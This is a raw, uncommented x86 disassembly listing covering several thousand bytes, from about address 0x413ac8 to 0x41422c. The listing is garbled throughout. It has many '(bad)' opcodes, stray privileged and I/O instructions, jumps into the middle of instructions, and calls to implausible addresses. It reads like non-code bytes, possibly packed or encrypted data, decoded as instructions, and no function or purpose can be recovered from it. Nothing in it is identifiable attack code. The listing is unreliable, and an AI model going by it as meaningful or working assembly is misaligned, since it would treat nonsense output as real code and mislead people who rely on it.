  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
